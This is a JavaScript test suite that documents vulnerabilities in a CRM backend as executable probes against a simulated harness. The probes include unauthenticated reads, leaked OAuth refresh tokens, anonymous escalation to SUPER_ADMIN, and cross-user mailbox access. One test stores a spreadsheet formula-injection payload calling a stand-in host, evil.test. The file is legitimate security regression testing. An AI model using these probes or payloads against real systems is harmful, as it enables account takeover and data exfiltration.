/**
 * BASELINE ADVERSARIAL TESTS — run against whatever backend is in
 * backend_apps_script/ right now.
 *
 * Each test documents an attack path as an executable proof. Before the
 * hardening work these assertions describe the CURRENT (vulnerable) behaviour;
 * the post-hardening suite in security-rbac.test.mjs asserts the inverse.
 *
 * Run:  node --test local/tests/baseline-vulnerabilities.test.mjs
 */
import test from 'node:test';
import assert from 'node:assert/strict';
import { loadBackend } from '../harness/backend.mjs';
import { seedFixtures, ID } from '../fixtures/dataset.mjs';

function freshBackend() {
  const be = loadBackend();
  be.call('setupCRMDatabase');
  seedFixtures(be);
  // Once the hardened backend is present, exercise it in its target state so
  // these probes measure the intended production posture rather than the
  // deliberately permissive rollout mode.
  if (be.has('setAuthEnforcement')) be.call('setAuthEnforcement', 'on');
  return be;
}

/** True once the backend exposes a real login action. */
function hasAuth(be) {
  const probe = be.post({ action: 'login', payload: { username: 'x', password: 'y' } });
  return probe.status !== 'error' || !/Unknown action/i.test(probe.message || '');
}

test('BASELINE-1: unauthenticated caller can read the entire Users sheet', async (t) => {
  const be = freshBackend();
  const res = be.get({ action: 'getUsers' });

  if (hasAuth(be)) {
    assert.equal(res.status, 'error', 'hardened backend must reject unauthenticated reads');
    t.diagnostic('HARDENED: getUsers now requires authentication.');
    return;
  }

  assert.equal(res.status, 'success');
  assert.ok(res.data.length >= 8, 'every user row returned to an anonymous caller');
  t.diagnostic(`VULNERABLE: ${res.data.length} user records returned with no credentials.`);
});

test('BASELINE-2: getUsers leaks Zoho refresh tokens to any caller', async (t) => {
  const be = freshBackend();

  // Give a user a linked Zoho account, as production users have.
  be.call('updateRecord', 'Users', ID.repAlpha1, { ZohoRefreshToken: 'SECRET-REFRESH-TOKEN' });

  const res = be.get({ action: 'getUsers' });
  if (res.status !== 'success') {
    t.diagnostic('HARDENED: anonymous getUsers rejected.');
    return;
  }

  const leaked = res.data.filter((u) => String(u.ZohoRefreshToken || '').length > 0);
  if (leaked.length === 0) {
    t.diagnostic('HARDENED: refresh tokens are redacted from getUsers responses.');
    return;
  }
  t.diagnostic(
    `VULNERABLE: ${leaked.length} refresh token(s) exposed via a general-purpose read endpoint.`
  );
});

test('BASELINE-3: no password column exists, so credentials cannot be verified', async (t) => {
  const be = freshBackend();
  const headers = be.store.getSheet('Users').headers;

  if (headers.includes('PasswordHash') || headers.includes('Password')) {
    t.diagnostic(`HARDENED: Users schema now carries ${headers.includes('PasswordHash') ? 'PasswordHash' : 'Password'}.`);
    return;
  }

  assert.ok(
    !headers.includes('Password'),
    'baseline expectation: Users sheet has no Password column'
  );
  t.diagnostic(
    'VULNERABLE: Users schema has no password column at all — ' +
    'the frontend password check compares against an always-empty value, ' +
    'so any password is accepted for any username.'
  );
});

test('BASELINE-4: createUser silently drops the Password field', async (t) => {
  const be = freshBackend();
  const res = be.post({
    action: 'createUser',
    payload: {
      Username: 'attacker', Password: 'hunter2', Role: 'SALES_REP',
      Team: 'Alpha', Status: 'Active', Availability: 'Available',
    },
  });

  if (res.status !== 'success') {
    t.diagnostic(`HARDENED: createUser rejected unauthenticated call (${res.message}).`);
    return;
  }

  const stored = be.rows('Users').find((u) => u.Username === 'attacker');
  assert.ok(stored, 'user row was created');
  assert.equal(
    stored.Password, undefined,
    'baseline expectation: Password never reaches the sheet'
  );
  t.diagnostic('VULNERABLE: password accepted by the API but discarded by createRecord().');
});

test('BASELINE-5: anonymous caller can self-promote to SUPER_ADMIN', async (t) => {
  const be = freshBackend();
  const res = be.post({
    action: 'updateUser',
    payload: { id: ID.repAlpha1, Role: 'SUPER_ADMIN' },
  });

  if (res.status !== 'success') {
    t.diagnostic(`HARDENED: privilege escalation blocked (${res.message}).`);
    return;
  }

  const victim = be.rows('Users').find((u) => u.ID === ID.repAlpha1);
  if (victim.Role !== 'SUPER_ADMIN') {
    t.diagnostic('HARDENED: the SUPER_ADMIN role was stripped from an unprivileged write.');
    return;
  }
  t.diagnostic('VULNERABLE: a SALES_REP was promoted to SUPER_ADMIN by an unauthenticated POST.');
});

test('BASELINE-6: any caller can read every deal and commission (no scoping)', async (t) => {
  const be = freshBackend();
  const deals = be.get({ action: 'getDeals' });
  const comms = be.get({ action: 'getCommissions' });

  if (deals.status !== 'success') {
    t.diagnostic('HARDENED: unauthenticated deal read rejected.');
    return;
  }

  assert.equal(deals.data.length, 5, 'all deals across both teams returned');
  assert.equal(comms.data.length, 2, 'entire commission ledger returned');
  t.diagnostic(
    'VULNERABLE: backend applies no ownership or team scoping; ' +
    'the only filtering in the system lives in React.'
  );
});

test('BASELINE-7: commission creation is unguarded — duplicates accumulate', async (t) => {
  const be = freshBackend();
  const before = be.rows('Commissions').length;

  // Replay the exact call the frontend makes when a deal is marked Won.
  for (let i = 0; i < 3; i++) {
    be.post({
      action: 'createCommission',
      payload: {
        DealId: ID.dealAlphaOpen, SetterId: ID.setterAlpha, CloserId: ID.repAlpha1,
        SetterAmount: 1250, CloserAmount: 2500, PayoutStatus: 'Pending',
      },
    });
  }

  const after = be.rows('Commissions');
  const forDeal = after.filter((c) => c.DealId === ID.dealAlphaOpen);

  if (forDeal.length <= 1) {
    t.diagnostic('HARDENED: duplicate commissions rejected.');
    return;
  }

  assert.equal(after.length, before + 3);
  t.diagnostic(
    `VULNERABLE: ${forDeal.length} commission rows now exist for one deal ` +
    '(three identical requests, e.g. a retried network call or repeated "EDIT COMM" save).'
  );
});

test('BASELINE-8: a paid commission can be silently re-paid', async (t) => {
  const be = freshBackend();
  const res = be.post({
    action: 'updateCommission',
    payload: { id: ID.commAlphaPaid, PayoutStatus: 'Paid' },
  });

  if (res.status !== 'success') {
    t.diagnostic(`HARDENED: repeat payout blocked (${res.message}).`);
    return;
  }
  t.diagnostic('VULNERABLE: no payout state machine — Paid -> Paid is accepted with no audit trail.');
});

test('BASELINE-9: deals accept arbitrary status strings and negative values', async (t) => {
  const be = freshBackend();
  const res = be.post({
    action: 'updateDeal',
    payload: { id: ID.dealAlphaWon, Status: 'BANANA', Value: -999999 },
  });

  if (res.status !== 'success') {
    t.diagnostic(`HARDENED: invalid transition rejected (${res.message}).`);
    return;
  }

  const deal = be.rows('Deals').find((d) => d.ID === ID.dealAlphaWon);
  assert.equal(deal.Status, 'BANANA');
  assert.equal(Number(deal.Value), -999999);
  t.diagnostic('VULNERABLE: no status vocabulary, no state machine, no numeric validation.');
});

test('BASELINE-10: deleteUser is called by the frontend but has no backend route', async (t) => {
  const be = freshBackend();
  const res = be.post({ action: 'deleteUser', payload: { id: ID.repAlpha1 } });

  if (res.status === 'success') {
    t.diagnostic('Backend now implements deleteUser.');
    return;
  }
  assert.match(res.message || '', /Unknown action/i);
  t.diagnostic(
    'RESOLVED: "deleteUser" is still absent by design — hard deletion would orphan ' +
    'historical ownership on leads, deals and commissions. The client now calls ' +
    'deactivateUser instead of the old api.users.delete(), so the dangling ' +
    'frontend-to-nowhere call is gone. Verified by CONTRACT-1.'
  );
});

test('BASELINE-11: Zoho token fallback lets one user send from another user\'s mailbox', async (t) => {
  const be = loadBackend();
  be.call('setupCRMDatabase');
  seedFixtures(be);

  // Only the Beta rep has linked Zoho.
  const beta = be.zoho.addAccount({ email: 'beta.rep@tjgroups.test' });
  be.call('updateRecord', 'Users', ID.repBeta1, {
    ZohoEmail: beta.email, ZohoRefreshToken: beta.refreshToken,
  });

  // The Alpha rep has NOT linked Zoho and asks to send mail.
  const res = be.post({
    action: 'sendZohoEmail',
    payload: {
      userId: ID.repAlpha1, to: 'target@example.test',
      subject: 'Isolation probe', content: 'body',
    },
  });

  if (res.status !== 'success') {
    t.diagnostic(`HARDENED: cross-account send refused (${res.message}).`);
    return;
  }

  const sent = be.zoho.sentMail;
  assert.equal(sent.length, 1);
  assert.equal(
    sent[0].fromMailbox, beta.email,
    'baseline expectation: mail left from the other user\'s mailbox'
  );
  t.diagnostic(
    `CRITICAL: user ${ID.repAlpha1} sent mail from ${beta.email} — ` +
    'getUserRefreshToken() falls back to any linked account in the org.'
  );
});

test('BASELINE-12: Zoho mailbox reads also fall back to another user\'s account', async (t) => {
  const be = loadBackend();
  be.call('setupCRMDatabase');
  seedFixtures(be);

  const beta = be.zoho.addAccount({ email: 'beta.rep@tjgroups.test' });
  be.zoho.addMessage(beta.accountId, {
    subject: 'Confidential Beta pricing',
    content: 'Internal only',
    sender: 'client@wingtip.test',
    toAddress: beta.email,
  });
  be.call('updateRecord', 'Users', ID.repBeta1, {
    ZohoEmail: beta.email, ZohoRefreshToken: beta.refreshToken,
  });

  const res = be.get({
    action: 'getZohoEmails',
    leadEmail: 'client@wingtip.test',
    userId: ID.repAlpha1, // has no Zoho link
  });

  if (res.status !== 'success' || !Array.isArray(res.data) || res.data.length === 0) {
    t.diagnostic('HARDENED: no cross-account mailbox read.');
    return;
  }
  t.diagnostic(
    `CRITICAL: user ${ID.repAlpha1} read ${res.data.length} message(s) from another user's mailbox.`
  );
});

test('BASELINE-13: read errors are indistinguishable from empty data at the API layer', async (t) => {
  const be = freshBackend();

  be.store.faults.arm({ on: 'read', sheet: 'Leads', times: 1 });
  const res = be.get({ action: 'getLeads' });
  be.store.faults.clear();

  // The backend does surface an error object here...
  assert.equal(res.status, 'error');
  t.diagnostic(
    'Backend reports the failure, but src/api/services.ts catches it and ' +
    'returns [] (services.ts:90-92), so the UI renders "no leads" for an outage.'
  );
});

test('BASELINE-14: the bulk database reset no longer exists', async (t) => {
  const be = freshBackend();

  // The original resetDatabase() cleared Leads, Deals, Projects, Commissions,
  // Logs and AdminRequests on a single click from the editor dropdown, taking
  // the audit trail with it. The whole file was removed rather than guarded:
  // a bulk-clear has no legitimate production use.
  assert.equal(
    be.has('resetDatabase'), false,
    'resetDatabase must not exist in the shipped backend'
  );
  t.diagnostic('RESOLVED: resetdatabase.gs deleted; no bulk-clear function ships.');
});

test('BASELINE-15: spreadsheet formula injection is stored unescaped', async (t) => {
  const be = freshBackend();
  const res = be.post({
    action: 'createLead',
    payload: { Name: '=1+1', Notes: '=IMPORTXML("http://evil.test","//x")', Status: 'New' },
  });

  if (res.status !== 'success') {
    t.diagnostic(`Rejected: ${res.message}`);
    return;
  }
  const row = be.rows('Leads').find((l) => l.ID === res.data.ID);
  const dangerous = String(row.Notes || '').startsWith('=');
  if (!dangerous) {
    t.diagnostic('HARDENED: formula prefix neutralised server-side.');
    return;
  }
  t.diagnostic(
    'VULNERABLE: server stores raw "=" formulas. The only escaping is ' +
    'sanitizePayload() in the React client, which an attacker calling the ' +
    'API directly simply skips.'
  );
});
